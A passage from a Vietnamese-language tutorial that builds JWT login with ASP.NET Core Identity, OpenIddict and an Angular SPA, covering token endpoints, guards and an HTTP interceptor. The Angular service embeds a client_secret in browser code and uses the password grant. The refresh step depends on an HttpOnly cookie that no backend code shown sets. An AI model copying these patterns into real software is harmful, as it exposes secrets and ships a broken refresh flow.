# Áp dụng migration lên database (tạo bảng)
# Bao gồm cả bảng Identity (AspNetUsers, ...) và OpenIddict (OpenIddictApplications, ...)
dotnet ef database update
```

**Các bảng được tạo:**
```
ASP.NET Core Identity:
  AspNetUsers            ← ApplicationUser data
  AspNetRoles            ← Role definitions
  AspNetUserRoles        ← User ↔ Role mapping
  AspNetUserClaims       ← Custom claims per user
  AspNetRoleClaims       ← Claims per role

OpenIddict:
  OpenIddictApplications ← Registered OAuth clients (angular-spa)
  OpenIddictAuthorizations ← Authorization grants
  OpenIddictScopes       ← Available OAuth scopes
  OpenIddictTokens       ← Issued tokens (access + refresh)
```

---

## 6. Authorization Controller

```csharp
// Controllers/AuthorizationController.cs

using System.Security.Claims;
using AuthDemo.Api.Models;
using Microsoft.AspNetCore;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using OpenIddict.Abstractions;
using OpenIddict.Server.AspNetCore;
using static OpenIddict.Abstractions.OpenIddictConstants;

namespace AuthDemo.Api.Controllers;

/// <summary>
/// Xử lý các OpenIddict endpoints:
/// - POST /connect/token    → Đăng nhập, lấy token
/// - POST /connect/logout   → Đăng xuất, revoke token
/// - GET  /connect/userinfo → Lấy thông tin user từ token
/// </summary>
[ApiController]
public class AuthorizationController : ControllerBase
{
    private readonly UserManager<ApplicationUser> _userManager;
    private readonly SignInManager<ApplicationUser> _signInManager;
    private readonly IOpenIddictApplicationManager _applicationManager;
    private readonly ILogger<AuthorizationController> _logger;

    public AuthorizationController(
        UserManager<ApplicationUser> userManager,
        SignInManager<ApplicationUser> signInManager,
        IOpenIddictApplicationManager applicationManager,
        ILogger<AuthorizationController> logger)
    {
        _userManager = userManager;
        _signInManager = signInManager;
        _applicationManager = applicationManager;
        _logger = logger;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // POST /connect/token
    // ─────────────────────────────────────────────────────────────────────────
    /// <summary>
    /// Token endpoint — nhận credentials và trả về JWT tokens.
    /// Hỗ trợ 2 grant types:
    /// 1. password: username + password → access_token + refresh_token
    /// 2. refresh_token: refresh_token → access_token mới (+ refresh_token mới)
    /// </summary>
    [HttpPost("~/connect/token")]
    [Produces("application/json")]
    public async Task<IActionResult> Exchange()
    {
        // GetOpenIddictServerRequest() phân tích HTTP request và trả về OpenIddict request object
        // Chứa thông tin: grant_type, username, password, refresh_token, client_id, scope...
        var request = HttpContext.GetOpenIddictServerRequest()
            ?? throw new InvalidOperationException("OpenIddict server request không tìm thấy.");

        // ─── GRANT TYPE: password (login bằng username/password) ────────────────
        if (request.IsPasswordGrantType())
        {
            return await HandlePasswordGrantAsync(request);
        }

        // ─── GRANT TYPE: refresh_token (lấy access token mới) ──────────────────
        if (request.IsRefreshTokenGrantType())
        {
            return await HandleRefreshTokenGrantAsync(request);
        }

        // Nếu grant_type không được hỗ trợ → trả lỗi
        return BadRequest(new OpenIddictResponse
        {
            Error = Errors.UnsupportedGrantType,
            ErrorDescription = "Grant type không được hỗ trợ."
        });
    }

    private async Task<IActionResult> HandlePasswordGrantAsync(OpenIddictRequest request)
    {
        // Tìm user theo username hoặc email
        // Cho phép login bằng cả username và email (tiện dụng hơn)
        var user = await _userManager.FindByNameAsync(request.Username!)
                ?? await _userManager.FindByEmailAsync(request.Username!);

        if (user == null)
        {
            // Log cẩn thận: không ghi username vào log để tránh PII trong log file
            _logger.LogWarning("Đăng nhập thất bại: username không tồn tại. IP: {IP}",
                HttpContext.Connection.RemoteIpAddress);

            // Trả về lỗi chuẩn OAuth2 — không tiết lộ username có tồn tại hay không
            // (tránh username enumeration attack)
            return Forbid(
                authenticationSchemes: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                properties: new AuthenticationProperties(new Dictionary<string, string?>
                {
                    [OpenIddictServerAspNetCoreConstants.Properties.Error] = Errors.InvalidGrant,
                    [OpenIddictServerAspNetCoreConstants.Properties.ErrorDescription] =
                        "Username hoặc mật khẩu không đúng."
                }));
        }

        // Kiểm tra xem user có bị khóa không (lockout)
        // Identity tự theo dõi số lần thất bại và thời gian khóa
        if (await _userManager.IsLockedOutAsync(user))
        {
            var lockoutEnd = await _userManager.GetLockoutEndDateAsync(user);
            _logger.LogWarning("Tài khoản bị khóa: {UserId}. Hết hạn: {LockoutEnd}",
                user.Id, lockoutEnd);

            return Forbid(
                authenticationSchemes: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                properties: new AuthenticationProperties(new Dictionary<string, string?>
                {
                    [OpenIddictServerAspNetCoreConstants.Properties.Error] = Errors.AccessDenied,
                    [OpenIddictServerAspNetCoreConstants.Properties.ErrorDescription] =
                        $"Tài khoản bị khóa tạm thời đến {lockoutEnd:HH:mm dd/MM/yyyy}."
                }));
        }

        // Verify mật khẩu
        // CheckPasswordSignInAsync cũng xử lý lockout increment khi sai mật khẩu
        var result = await _signInManager.CheckPasswordSignInAsync(
            user,
            request.Password!,
            lockoutOnFailure: true); // Tự động tăng failed count và lockout nếu cần

        if (!result.Succeeded)
        {
            _logger.LogWarning("Mật khẩu sai cho user: {UserId}. IP: {IP}",
                user.Id, HttpContext.Connection.RemoteIpAddress);

            return Forbid(
                authenticationSchemes: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                properties: new AuthenticationProperties(new Dictionary<string, string?>
                {
                    [OpenIddictServerAspNetCoreConstants.Properties.Error] = Errors.InvalidGrant,
                    [OpenIddictServerAspNetCoreConstants.Properties.ErrorDescription] =
                        "Username hoặc mật khẩu không đúng."
                }));
        }

        // Reset failed count sau khi đăng nhập thành công
        await _userManager.ResetAccessFailedCountAsync(user);

        // Tạo ClaimsIdentity — chứa thông tin về user sẽ được encode vào JWT
        var identity = await BuildClaimsIdentityAsync(user);

        // Tạo ClaimsPrincipal từ identity
        var principal = new ClaimsPrincipal(identity);

        // Thiết lập scopes từ request (openid, profile, email, roles)
        principal.SetScopes(request.GetScopes());

        _logger.LogInformation("Đăng nhập thành công: {UserId} ({Email}). IP: {IP}",
            user.Id, user.Email, HttpContext.Connection.RemoteIpAddress);

        // SignIn với OpenIddict scheme → OpenIddict tạo JWT và trả về response
        return SignIn(principal, OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);
    }

    private async Task<IActionResult> HandleRefreshTokenGrantAsync(OpenIddictRequest request)
    {
        // Xác thực refresh token hiện tại
        // OpenIddict kiểm tra: token có tồn tại trong DB, có hết hạn chưa, có bị revoke chưa
        var result = await HttpContext.AuthenticateAsync(
            OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);

        if (!result.Succeeded)
        {
            return Forbid(
                authenticationSchemes: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                properties: new AuthenticationProperties(new Dictionary<string, string?>
                {
                    [OpenIddictServerAspNetCoreConstants.Properties.Error] = Errors.InvalidGrant,
                    [OpenIddictServerAspNetCoreConstants.Properties.ErrorDescription] =
                        "Refresh token không hợp lệ hoặc đã hết hạn."
                }));
        }

        // Lấy user từ claims trong refresh token
        var userId = result.Principal?.GetClaim(Claims.Subject);
        var user = await _userManager.FindByIdAsync(userId!);

        if (user == null)
        {
            return Forbid(
                authenticationSchemes: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                properties: new AuthenticationProperties(new Dictionary<string, string?>
                {
                    [OpenIddictServerAspNetCoreConstants.Properties.Error] = Errors.InvalidGrant,
                    [OpenIddictServerAspNetCoreConstants.Properties.ErrorDescription] =
                        "User không còn tồn tại."
                }));
        }

        // Kiểm tra user có bị khóa không (quan trọng: user có thể bị khóa sau khi refresh token được phát)
        if (await _userManager.IsLockedOutAsync(user))
        {
            return Forbid(
                authenticationSchemes: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                properties: new AuthenticationProperties(new Dictionary<string, string?>
                {
                    [OpenIddictServerAspNetCoreConstants.Properties.Error] = Errors.AccessDenied,
                    [OpenIddictServerAspNetCoreConstants.Properties.ErrorDescription] =
                        "Tài khoản bị khóa."
                }));
        }

        // Tạo claims identity mới với thông tin user hiện tại (role có thể đã thay đổi)
        var identity = await BuildClaimsIdentityAsync(user);
        var principal = new ClaimsPrincipal(identity);

        // Giữ nguyên scopes từ refresh token cũ
        principal.SetScopes(result.Principal!.GetScopes());

        _logger.LogInformation("Refresh token thành công cho user: {UserId}", user.Id);

        return SignIn(principal, OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);
    }

    /// <summary>
    /// Tạo ClaimsIdentity chứa đầy đủ thông tin user để encode vào JWT.
    /// Claims này sẽ được API đọc để biết ai đang gọi và họ có quyền gì.
    /// </summary>
    private async Task<ClaimsIdentity> BuildClaimsIdentityAsync(ApplicationUser user)
    {
        // ClaimsIdentity với OpenIddict authentication scheme
        var identity = new ClaimsIdentity(
            authenticationType: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
            nameType: Claims.Name,   // Claim nào chứa "name" của user
            roleType: Claims.Role);  // Claim nào chứa "role" của user

        // Subject (sub) — ID duy nhất của user trong token
        // ĐÂY LÀ CLAIM BẮT BUỘC trong OIDC
        identity.SetClaim(Claims.Subject, await _userManager.GetUserIdAsync(user));

        // Name — username hiển thị
        identity.SetClaim(Claims.Name, await _userManager.GetUserNameAsync(user));

        // Email
        identity.SetClaim(Claims.Email, await _userManager.GetEmailAsync(user));

        // Custom claims — thêm thông tin nghiệp vụ
        if (user.FullName != null)
        {
            identity.SetClaim("full_name", user.FullName);
        }

        // Roles — quan trọng cho phân quyền ở Angular và API
        // Mỗi role được thêm như một claim riêng
        var roles = await _userManager.GetRolesAsync(user);
        identity.SetClaims(Claims.Role, roles.ToImmutableArray());

        // SetDestinations: chỉ định claim này xuất hiện ở đâu
        // AccessToken: claim xuất hiện trong access token (API dùng)
        // IdentityToken: claim xuất hiện trong identity token (client dùng)
        foreach (var claim in identity.Claims)
        {
            claim.SetDestinations(GetDestinations(claim, identity));
        }

        return identity;
    }

    /// <summary>
    /// Quyết định claim nào được đưa vào loại token nào.
    /// Quan trọng: tránh đưa thông tin nhạy cảm vào token không cần thiết.
    /// </summary>
    private static IEnumerable<string> GetDestinations(Claim claim, ClaimsIdentity identity)
    {
        switch (claim.Type)
        {
            case Claims.Name:
                yield return Destinations.AccessToken;
                // Chỉ đưa vào IdentityToken nếu scope "profile" được request
                if (identity.HasScope(Scopes.Profile))
                    yield return Destinations.IdentityToken;
                yield break;

            case Claims.Email:
                yield return Destinations.AccessToken;
                // Chỉ đưa vào IdentityToken nếu scope "email" được request
                if (identity.HasScope(Scopes.Email))
                    yield return Destinations.IdentityToken;
                yield break;

            case Claims.Role:
                yield return Destinations.AccessToken;
                // Chỉ đưa vào IdentityToken nếu scope "roles" được request
                if (identity.HasScope(Scopes.Roles))
                    yield return Destinations.IdentityToken;
                yield break;

            case "full_name":
                // Custom claim: chỉ đưa vào AccessToken để API dùng
                yield return Destinations.AccessToken;
                yield break;

            default:
                // Các claim khác (SecurityStamp...) — chỉ AccessToken
                yield return Destinations.AccessToken;
                yield break;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // POST /connect/logout
    // ─────────────────────────────────────────────────────────────────────────
    [HttpPost("~/connect/logout")]
    public async Task<IActionResult> Logout()
    {
        // SignOut với OpenIddict scheme → OpenIddict revoke tất cả tokens của user
        // trong database (OpenIddictTokens table)
        await HttpContext.SignOutAsync(OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);

        _logger.LogInformation("User đăng xuất. IP: {IP}",
            HttpContext.Connection.RemoteIpAddress);

        return Ok(new { message = "Đăng xuất thành công." });
    }

    // ─────────────────────────────────────────────────────────────────────────
    // GET /connect/userinfo
    // ─────────────────────────────────────────────────────────────────────────
    [HttpGet("~/connect/userinfo")]
    [HttpPost("~/connect/userinfo")]
    public async Task<IActionResult> Userinfo()
    {
        // Xác thực request bằng Bearer token trong Authorization header
        var result = await HttpContext.AuthenticateAsync(
            OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);

        if (!result.Succeeded)
            return Challenge(OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);

        var userId = result.Principal?.GetClaim(Claims.Subject);
        var user = await _userManager.FindByIdAsync(userId!);
        if (user == null) return NotFound();

        var roles = await _userManager.GetRolesAsync(user);

        // Trả về thông tin user theo chuẩn OIDC UserInfo response
        return Ok(new
        {
            sub = user.Id,
            name = user.UserName,
            email = user.Email,
            full_name = user.FullName,
            roles = roles,
            email_verified = user.EmailConfirmed
        });
    }
}
```

---

## 7. Protected API Endpoints

```csharp
// Controllers/ApiController.cs

using System.Security.Claims;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;

namespace AuthDemo.Api.Controllers;

/// <summary>
/// Ví dụ API endpoint được bảo vệ bằng JWT Bearer authentication.
/// [Authorize] → OpenIddict validation middleware kiểm tra Bearer token
/// trước khi cho request đi vào action method.
/// </summary>
[ApiController]
[Route("api/[controller]")]
[Authorize] // Tất cả actions trong controller này đều cần xác thực
public class ApiController : ControllerBase
{
    private readonly ILogger<ApiController> _logger;

    public ApiController(ILogger<ApiController> logger)
    {
        _logger = logger;
    }

    // GET /api/api/me — lấy thông tin user đang đăng nhập
    [HttpGet("me")]
    public IActionResult GetCurrentUser()
    {
        // User.Claims chứa tất cả claims từ JWT token
        // OpenIddict đã validate và parse token trước khi request đến đây
        var userId = User.FindFirstValue(OpenIddict.Abstractions.OpenIddictConstants.Claims.Subject);
        var userName = User.FindFirstValue(ClaimTypes.Name)
                    ?? User.FindFirstValue(OpenIddict.Abstractions.OpenIddictConstants.Claims.Name);
        var email = User.FindFirstValue(ClaimTypes.Email)
                 ?? User.FindFirstValue(OpenIddict.Abstractions.OpenIddictConstants.Claims.Email);
        var fullName = User.FindFirstValue("full_name");
        var roles = User.FindAll(ClaimTypes.Role).Select(c => c.Value).ToList();

        return Ok(new
        {
            userId,
            userName,
            email,
            fullName,
            roles
        });
    }

    // GET /api/api/admin-only — chỉ Admin mới vào được
    [HttpGet("admin-only")]
    [Authorize(Roles = "Admin")] // Ghi đè [Authorize] ở controller level
    public IActionResult AdminOnly()
    {
        return Ok(new { message = "Bạn đang ở khu vực Admin." });
    }

    // GET /api/api/public — không cần đăng nhập
    [HttpGet("public")]
    [AllowAnonymous] // Cho phép anonymous, ghi đè [Authorize] ở controller
    public IActionResult PublicEndpoint()
    {
        return Ok(new { message = "Endpoint công khai, không cần đăng nhập." });
    }

    // GET /api/api/products — ví dụ resource được bảo vệ
    [HttpGet("products")]
    public IActionResult GetProducts()
    {
        // Lấy userId từ token để log ai đang truy cập
        var userId = User.FindFirstValue(OpenIddict.Abstractions.OpenIddictConstants.Claims.Subject);
        _logger.LogInformation("User {UserId} truy cập danh sách sản phẩm", userId);

        return Ok(new[]
        {
            new { id = 1, name = "Sản phẩm A", price = 100000 },
            new { id = 2, name = "Sản phẩm B", price = 200000 },
        });
    }
}
```

---

## 8. Setup Frontend

### 8.1 Tạo Angular Project

```bash
# Tạo Angular project với routing và SCSS
ng new auth-demo --routing --style=scss --standalone

# Di chuyển vào project
cd auth-demo

# Cài thư viện OIDC client (không tự viết OIDC flow)
npm install angular-oauth2-oidc

# Cài ngx-cookie-service để đọc HttpOnly cookie khi cần
npm install ngx-cookie-service
```

### 8.2 Cấu trúc thư mục Angular

```
src/app/
├── core/
│   ├── auth/
│   │   ├── auth.service.ts          ← Logic login/logout/refresh
│   │   ├── token.service.ts         ← Quản lý lưu trữ token
│   │   ├── auth.guard.ts            ← Route guard
│   │   ├── permission.guard.ts      ← Permission-based guard
│   │   └── auth.interceptor.ts      ← Tự động attach Bearer token
│   ├── models/
│   │   ├── user.model.ts            ← Interface User
│   │   └── auth-response.model.ts   ← Interface token response
│   └── services/
│       └── api.service.ts           ← HTTP wrapper
├── features/
│   ├── auth/
│   │   └── login/
│   │       ├── login.component.ts
│   │       ├── login.component.html
│   │       └── login.component.scss
│   └── dashboard/
│       └── dashboard.component.ts
├── app.component.ts
├── app.config.ts                    ← Providers (Angular 17 Standalone)
└── app.routes.ts                    ← Route definitions
```

---

## 9. Auth Service & Token Strategy

### 9.1 Models

```typescript
// core/models/auth-response.model.ts

export interface TokenResponse {
  access_token: string;
  token_type: string;        // Luôn là "Bearer"
  expires_in: number;        // Số giây token còn sống (vd: 3600)
  refresh_token?: string;    // Chỉ có khi scope includes "offline_access" hoặc refresh được cấu hình
  scope: string;             // "openid profile email roles"
}

export interface UserInfo {
  sub: string;               // User ID (Subject claim)
  name: string;              // Username
  email: string;
  full_name?: string;
  roles: string[];
  email_verified: boolean;
}
```

### 9.2 Token Service — Chiến lược lưu token

```typescript
// core/auth/token.service.ts

import { Injectable } from '@angular/core';

/**
 * Quản lý việc lưu trữ JWT token.
 * 
 * CHIẾN LƯỢC: In-Memory cho Access Token + RefreshToken KHÔNG lưu ở client
 * 
 * Lý do:
 * - Access token trong memory: XSS không đọc được (không phải localStorage)
 * - Refresh token: backend set vào HttpOnly cookie (JS không đọc được)
 * - Khi F5: access token mất, Angular tự gọi /connect/token với refresh token
 *   từ HttpOnly cookie để lấy access token mới
 * 
 * Trade-off: Mất UX một chút (F5 → ngắn spinner) nhưng bảo mật cao hơn nhiều
 */
@Injectable({ providedIn: 'root' })
export class TokenService {
  // Lưu trong biến JavaScript thuần — không localStorage, không sessionStorage
  // Sẽ bị xóa khi: F5, đóng tab, timeout Angular garbage collection
  private accessToken: string | null = null;
  private tokenExpiry: Date | null = null;
  private userInfo: any | null = null;

  /**
   * Lưu access token sau khi đăng nhập thành công.
   * @param token JWT access token
   * @param expiresIn Số giây token còn sống
   */
  setAccessToken(token: string, expiresIn: number): void {
    this.accessToken = token;
    // Tính thời điểm hết hạn, trừ 60 giây để refresh trước khi expired
    this.tokenExpiry = new Date(Date.now() + (expiresIn - 60) * 1000);
  }

  /**
   * Lấy access token nếu còn hạn.
   * @returns Token string hoặc null nếu không có hoặc đã hết hạn
   */
  getAccessToken(): string | null {
    if (!this.accessToken || !this.tokenExpiry) return null;
    // Kiểm tra token còn hạn không
    if (new Date() >= this.tokenExpiry) {
      this.clearAccessToken();
      return null;
    }
    return this.accessToken;
  }

  /**
   * Kiểm tra access token còn hiệu lực không.
   */
  isAccessTokenValid(): boolean {
    return this.getAccessToken() !== null;
  }

  setUserInfo(user: any): void {
    this.userInfo = user;
  }

  getUserInfo(): any | null {
    return this.userInfo;
  }

  /**
   * Xóa toàn bộ auth state khỏi memory.
   * Gọi khi logout.
   */
  clearAll(): void {
    this.accessToken = null;
    this.tokenExpiry = null;
    this.userInfo = null;
  }

  private clearAccessToken(): void {
    this.accessToken = null;
    this.tokenExpiry = null;
  }
}
```

### 9.3 Auth Service — Logic chính

```typescript
// core/auth/auth.service.ts

import { Injectable, signal, computed } from '@angular/core';
import { HttpClient, HttpHeaders, HttpParams } from '@angular/common/http';
import { Router } from '@angular/router';
import { Observable, BehaviorSubject, throwError, of } from 'rxjs';
import { tap, catchError, switchMap, map } from 'rxjs/operators';
import { TokenService } from './token.service';
import { TokenResponse, UserInfo } from '../models/auth-response.model';
import { environment } from '../../../environments/environment';

@Injectable({ providedIn: 'root' })
export class AuthService {
  private readonly API_URL = environment.apiUrl;  // http://localhost:5000
  
  // Signal để reactive update — Angular 17 Signals API
  // Component subscribe vào signal này để update UI khi auth state thay đổi
  private _isAuthenticated = signal(false);
  private _currentUser = signal<UserInfo | null>(null);
  
  // Computed signals — tự động tính từ signal gốc
  isAuthenticated = computed(() => this._isAuthenticated());
  currentUser = computed(() => this._currentUser());
  
  // Subject để theo dõi trạng thái đang refresh token
  // Tránh nhiều request cùng lúc cùng gọi refresh
  private refreshTokenInProgress = false;

  constructor(
    private http: HttpClient,
    private router: Router,
    private tokenService: TokenService
  ) {}

  /**
   * Đăng nhập bằng username/password.
   * Gọi POST /connect/token với grant_type=password.
   * 
   * OAuth2 Resource Owner Password Credentials Flow:
   * Client → POST /connect/token {grant_type, username, password, client_id, scope}
   * Server → {access_token, refresh_token, expires_in}
   */
  login(username: string, password: string): Observable<UserInfo> {
    // OAuth2 token request phải dùng Content-Type: application/x-www-form-urlencoded
    // KHÔNG phải application/json — đây là yêu cầu của OAuth2 spec
    const body = new HttpParams()
      .set('grant_type', 'password')
      .set('username', username)
      .set('password', password)
      .set('client_id', 'angular-spa')
      .set('client_secret', 'your-super-secret-key-change-in-production')
      .set('scope', 'openid profile email roles');  // Yêu cầu các scopes cần thiết

    const headers = new HttpHeaders({
      'Content-Type': 'application/x-www-form-urlencoded'
    });

    return this.http
      .post<TokenResponse>(`${this.API_URL}/connect/token`, body.toString(), { headers })
      .pipe(
        // tap: side effect sau khi response trả về thành công
        tap(response => {
          // Lưu access token vào memory
          this.tokenService.setAccessToken(response.access_token, response.expires_in);
          
          // Lưu refresh token: backend sẽ set HttpOnly cookie tự động
          // Angular không cần làm gì với refresh_token trong response
          // (Nếu backend cấu hình refresh token qua cookie thay vì response body)
        }),
        // switchMap: sau khi lưu token, tự động lấy thông tin user
        switchMap(() => this.fetchUserInfo()),
        tap(user => {
          this._currentUser.set(user);
          this._isAuthenticated.set(true);
        }),
        catchError(error => {
          console.error('Đăng nhập thất bại:', error);
          return throwError(() => this.parseError(error));
        })
      );
  }

  /**
   * Lấy thông tin user hiện tại từ server.
   * Gọi GET /connect/userinfo với Bearer token.
   */
  fetchUserInfo(): Observable<UserInfo> {
    return this.http.get<UserInfo>(`${this.API_URL}/connect/userinfo`);
  }

  /**
   * Đăng xuất.
   * 1. Gọi POST /connect/logout để revoke token trên server
   * 2. Xóa token khỏi memory
   * 3. Redirect về login page
   */
  logout(): void {
    const token = this.tokenService.getAccessToken();
    
    if (token) {
      // Gọi logout endpoint để revoke token trong OpenIddict DB
      // Backend sẽ xóa token khỏi OpenIddictTokens table
      this.http.post(`${this.API_URL}/connect/logout`, {}).pipe(
        catchError(() => of(null)) // Ignore lỗi logout — vẫn xóa local state
      ).subscribe(() => {
        this.clearAuthState();
      });
    } else {
      this.clearAuthState();
    }
  }

  /**
   * Thử refresh access token bằng refresh token trong cookie.
   * Được gọi bởi HTTP interceptor khi nhận 401.
   * 
   * Lưu ý: Refresh token nằm trong HttpOnly cookie, trình duyệt tự gửi kèm request
   * → Angular không cần truyền refresh_token trong body
   */
  refreshAccessToken(): Observable<TokenResponse> {
    if (this.refreshTokenInProgress) {
      // Nếu đang refresh, chờ kết quả (không gọi 2 lần)
      // Production: nên dùng Subject + shareReplay để queue requests
      return throwError(() => new Error('Đang refresh token'));
    }

    this.refreshTokenInProgress = true;

    const body = new HttpParams()
      .set('grant_type', 'refresh_token')
      .set('client_id', 'angular-spa')
      .set('client_secret', 'your-super-secret-key-change-in-production');

    const headers = new HttpHeaders({
      'Content-Type': 'application/x-www-form-urlencoded'
    });

    return this.http
      .post<TokenResponse>(
        `${this.API_URL}/connect/token`,
        body.toString(),
        { 
          headers,
          // withCredentials = true: cho phép gửi cookie cross-origin
          // Cần thiết để HttpOnly refresh token cookie được gửi kèm
          withCredentials: true 
        }
      )
      .pipe(
        tap(response => {
          this.tokenService.setAccessToken(response.access_token, response.expires_in);
          this._isAuthenticated.set(true);
          this.refreshTokenInProgress = false;
        }),
        catchError(error => {
          this.refreshTokenInProgress = false;
          this.clearAuthState();
          return throwError(() => error);
        })
      );
  }

  /**
   * Kiểm tra xem user có role cụ thể không.
   * Dùng trong template và guards.
   */
  hasRole(role: string): boolean {
    const user = this._currentUser();
    return user?.roles?.includes(role) ?? false;
  }

  /**
   * Khởi tạo auth state khi app load (sau F5).
   * Thử refresh access token nếu có refresh token trong cookie.
   * Gọi trong APP_INITIALIZER.
   */
  initAuth(): Observable<boolean> {
    // Thử lấy access token mới bằng refresh token trong cookie
    return this.refreshAccessToken().pipe(
      switchMap(() => this.fetchUserInfo()),
      tap(user => {
        this._currentUser.set(user);
        this._isAuthenticated.set(true);
      }),
      map(() => true),
      catchError(() => {
        // Không có refresh token hợp lệ → user chưa đăng nhập
        this._isAuthenticated.set(false);
        return of(false);
      })
    );
  }

  private clearAuthState(): void {
    this.tokenService.clearAll();
    this._isAuthenticated.set(false);
    this._currentUser.set(null);
    this.router.navigate(['/auth/login']);
  }

  private parseError(error: any): string {
    if (error?.error?.error_description) {
      return error.error.error_description;
    }
    if (error?.error?.error) {
      return error.error.error;
    }
    return 'Đã xảy ra lỗi không xác định.';
  }
}
```

---

## 10. HTTP Interceptor & Guards

### 10.1 Auth Interceptor — Tự động attach Bearer token

```typescript
// core/auth/auth.interceptor.ts

import { HttpInterceptorFn, HttpRequest, HttpHandlerFn, HttpErrorResponse } from '@angular/common/http';
import { inject } from '@angular/core';
import { throwError, BehaviorSubject, Observable } from 'rxjs';
import { catchError, filter, take, switchMap } from 'rxjs/operators';
import { TokenService } from './token.service';
import { AuthService } from './auth.service';
import { Router } from '@angular/router';

/**
 * HTTP Interceptor dạng function (Angular 15+, không cần class).
 * Chạy trước mỗi HTTP request.
 * 
 * Nhiệm vụ:
 * 1. Đính kèm Bearer token vào Authorization header
 * 2. Khi nhận 401: thử refresh token, nếu fail thì redirect login
 */
export const authInterceptor: HttpInterceptorFn = (
  req: HttpRequest<any>,
  next: HttpHandlerFn
) => {
  const tokenService = inject(TokenService);
  const authService = inject(AuthService);
  const router = inject(Router);

  // Lấy access token hiện tại từ memory
  const token = tokenService.getAccessToken();

  // Clone request với Bearer token (không modify request gốc — immutable)
  const authReq = addTokenToRequest(req, token);

  return next(authReq).pipe(
    catchError((error) => {
      // Nếu nhận 401 Unauthorized
      if (error instanceof HttpErrorResponse && error.status === 401) {
        // Không retry refresh nếu request là chính /connect/token hoặc /connect/logout
        // (tránh infinite loop)
        if (req.url.includes('/connect/token') || req.url.includes('/connect/logout')) {
          router.navigate(['/auth/login']);
          return throwError(() => error);
        }

        // Thử refresh token
        return authService.refreshAccessToken().pipe(
          switchMap((response) => {
            // Refresh thành công → retry request gốc với token mới
            const newAuthReq = addTokenToRequest(req, response.access_token);
            return next(newAuthReq);
          }),
          catchError((refreshError) => {
            // Refresh thất bại → redirect về login
            router.navigate(['/auth/login']);
            return throwError(() => refreshError);
          })
        );
      }

      // Nếu nhận 403 Forbidden → không có quyền
      if (error instanceof HttpErrorResponse && error.status === 403) {
        router.navigate(['/403']);
        return throwError(() => error);
      }

      return throwError(() => error);
    })
  );
};

/**
 * Helper: tạo request mới với Authorization header.
 * Clone vì HttpRequest là immutable.
 */
function addTokenToRequest(req: HttpRequest<any>, token: string | null): HttpRequest<any> {
  if (!token) return req;
  
  return req.clone({
    setHeaders: {
      Authorization: `Bearer ${token}`
    }
  });
}
```

### 10.2 Auth Guard

```typescript
// core/auth/auth.guard.ts

import { inject } from '@angular/core';
import { CanActivateFn, Router, ActivatedRouteSnapshot, RouterStateSnapshot } from '@angular/router';
import { AuthService } from './auth.service';

/**
 * Guard kiểm tra user đã đăng nhập chưa.
 * Nếu chưa → redirect về /auth/login với returnUrl
 */
export const authGuard: CanActivateFn = (
  route: ActivatedRouteSnapshot,
  state: RouterStateSnapshot
) => {
  const authService = inject(AuthService);
  const router = inject(Router);

  if (authService.isAuthenticated()) {
    return true; // Cho qua
  }

  // Lưu URL đang cố truy cập để sau khi login redirect về đúng chỗ
  return router.createUrlTree(['/auth/login'], {
    queryParams: { returnUrl: state.url }
  });
};

/**
 * Guard kiểm tra user có role cụ thể không.
 * Sử dụng: canActivate: [authGuard, roleGuard('Admin')]
 * 
 * @param requiredRole Role cần thiết để truy cập route
 */
export const roleGuard = (requiredRole: string): CanActivateFn =>
  () => {
    const authService = inject(AuthService);
    const router = inject(Router);

    if (authService.hasRole(requiredRole)) {
      return true;
    }

    // Không có quyền → redirect về trang 403
    return router.createUrlTree(['/403']);
  };
```

---

## 11. Login Component & Flow

### 11.1 App Config (Angular 17 Standalone)

```typescript
// app.config.ts

import { ApplicationConfig, APP_INITIALIZER } from '@angular/core';
import { provideRouter } from '@angular/router';
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { routes } from './app.routes';
import { authInterceptor } from './core/auth/auth.interceptor';
import { AuthService } from './core/auth/auth.service';

/**
 * APP_INITIALIZER: chạy function trước khi app render.
 * Dùng để restore auth state sau F5.
 * 
 * Angular sẽ chờ Observable/Promise complete trước khi bootstrap component.
 */
function initializeAuth(authService: AuthService) {
  return () => authService.initAuth();
}

export const appConfig: ApplicationConfig = {
  providers: [
    provideRouter(routes),
    
    // Đăng ký HTTP interceptor dạng function (Angular 15+)
    provideHttpClient(
      withInterceptors([authInterceptor])
    ),
    
    // Khởi tạo auth state khi app load
    {
      provide: APP_INITIALIZER,
      useFactory: initializeAuth,
      deps: [AuthService],
      multi: true  // multi: true vì có thể có nhiều APP_INITIALIZER
    }
  ],
};
```

### 11.2 App Routes

```typescript
// app.routes.ts

import { Routes } from '@angular/router';
import { authGuard, roleGuard } from './core/auth/auth.guard';

export const routes: Routes = [
  {
    path: '',
    redirectTo: '/dashboard',
    pathMatch: 'full'
  },
  {
    path: 'auth',
    // Lazy load auth module — không load nếu user đã login
    loadChildren: () => import('./features/auth/auth.routes').then(m => m.authRoutes)
  },
  {
    path: 'dashboard',
    loadComponent: () => import('./features/dashboard/dashboard.component')
      .then(m => m.DashboardComponent),
    // Guard: phải đăng nhập mới vào được
    canActivate: [authGuard]
  },
  {
    path: 'admin',
    loadComponent: () => import('./features/admin/admin.component')
      .then(m => m.AdminComponent),
    // Guard: phải đăng nhập VÀ có role Admin
    canActivate: [authGuard, roleGuard('Admin')]
  },
  {
    path: '403',
    loadComponent: () => import('./features/errors/forbidden.component')
      .then(m => m.ForbiddenComponent)
  },
  {
    path: '**',
    redirectTo: '/dashboard'
  }
];
```

### 11.3 Login Component

```typescript
// features/auth/login/login.component.ts

import { Component, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
